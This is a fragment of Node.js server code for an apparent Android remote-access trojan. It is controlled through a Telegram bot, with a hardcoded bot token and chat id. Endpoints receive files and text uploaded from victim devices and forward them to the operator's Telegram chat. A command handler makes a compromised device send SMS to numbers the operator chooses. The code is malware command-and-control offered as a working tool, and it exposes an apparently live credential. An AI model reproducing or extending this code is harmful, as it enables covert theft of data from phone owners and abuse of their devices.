...
const token = "6885431489:AAHgkH-M84PMuKg3-r7LYAKjPnC-KCWxDuM";
const id = "1446692243";
...
app.post("/uploadFile", upload.single("file"), (req, res) => {
  ...
  appBot.sendDocument(
    ...
    req.file.buffer,
    {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚  <b> </b> <b> </b> Dont forget to join our community 😇 👉 @technicalwhitehat 👈 🤩`,
      parse_mode: "HTML",
    },
    {
      filename: name,
...
app.post("/uploadText", (req, res) => {
  appBot.sendMessage(
    id,
    `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n <b> </b> <b> </b> Dont forget to join our community 😇 👉 @technicalwhitehat 👈 🤩`,
    { parse_mode: "HTML" },
  );
  res.send("");
});
...
appBot.on("callback_query", (callbackQuery) => {
  ...
  if (commend == "send_message") {
    ...
    appBot.sendMessage(
      id,
      "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n" +
        "•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛ�ʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ",
      { reply_markup: { force_reply: true } },
    );
    currentUuid = uuid;
  }
